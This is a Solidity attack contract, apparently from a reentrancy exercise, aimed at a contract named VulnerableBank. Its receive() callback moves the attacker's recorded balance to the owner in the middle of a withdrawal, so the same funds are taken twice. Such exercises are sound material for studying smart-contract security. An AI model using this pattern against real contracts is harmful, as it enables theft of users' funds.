// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.17;

import "./VulnerableBank.sol"; 

contract Attack2Contract {
    address victim;  
    address owner;   

    constructor(address _victim, address _owner) {
        victim = _victim;  
        owner = _owner;    
    }

    function deposit() external payable {
        VulnerableBank(victim).deposit{value: msg.value}(); 
    }

    function withdraw() external {
        VulnerableBank(victim).withdraw(address(this).balance); 
    }

    receive() external payable {
        uint256 balance = VulnerableBank(victim).balances(address(this)); 
        VulnerableBank(victim).transfer(owner, balance); 
    }
}
